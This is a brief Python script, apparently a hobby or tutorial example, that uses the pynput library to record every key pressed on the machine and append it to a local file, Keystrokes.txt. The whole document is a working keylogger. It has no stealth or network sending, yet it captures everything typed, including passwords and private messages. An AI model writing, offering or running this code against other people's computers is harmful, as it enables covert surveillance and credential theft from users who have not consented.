from pynput.keyboard import Listener, Key

def writetofile(key):
    letter = str(key).replace("'","")
    if key == Key.space:
        letter = " "  # Space character
    elif key == Key.enter:
        letter = "\n"  # New line for Enter key
    elif key == Key.backspace:
        letter = "[BACKSPACE]"
    elif key == Key.tab:
        letter = "[TAB]"

    output = f"key Pressed: {letter}\n"
    
    with open("Keystrokes.txt", "a") as File:
        File.write(output)

#with will dump information automatically after action is done
with Listener(on_press = writetofile) as Listen:
    Listen.join()